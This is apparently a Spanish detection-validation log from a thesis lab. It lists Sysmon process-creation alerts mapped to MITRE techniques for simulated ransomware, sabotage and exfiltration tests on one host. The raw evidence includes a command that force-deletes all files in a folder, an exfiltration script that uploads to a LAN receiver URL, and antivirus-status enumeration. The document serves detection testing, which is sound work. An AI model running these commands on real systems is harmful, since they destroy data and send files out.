Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:52:15.300Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.979Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.915Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.916Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.979Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.915Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.916Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.686Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.594Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.686Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.594Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.446Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.446Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.918Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.918Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.128Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.128Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.679Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.564Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.679Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.564Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:42.311Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:42.311Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
